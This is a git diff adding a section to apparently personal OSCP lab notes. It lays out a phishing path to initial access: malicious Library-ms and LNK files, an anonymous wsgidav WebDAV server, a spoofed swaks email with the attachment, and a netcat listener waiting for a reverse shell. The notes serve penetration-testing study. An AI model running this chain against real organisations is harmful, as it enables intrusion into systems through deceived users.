@@ -114,6 +114,27 @@ Enum and login
 
 ```telnet $IP 110 #Connect to pop3```
 
+With these ports open and credentials, the initial access to the machine might be phishing:
+
+Create malicious file:
+
+config.Library-ms and install.LNK file: change the IP address and the download link.
+
+#Running webdav folder
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav
+#for newer version of KALI
+wsgidav  --host=0.0.0.0 --port=80 --auth=anonymous --root webdav
+
+#Send mail phishing
+sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.190.189
+--body @body. txt --header "Subject: Staging Script" --suppress-data -ap
+
+#wait for nc -lnvp 4444
+
+3. Priv
+=> get access to 14 - WK01 machine
+![image](https://github.com/chimmeee/OSCP_files/assets/112913821/063811a0-6579-41d1-a972-6a125837f8f2)
+
 
 
 
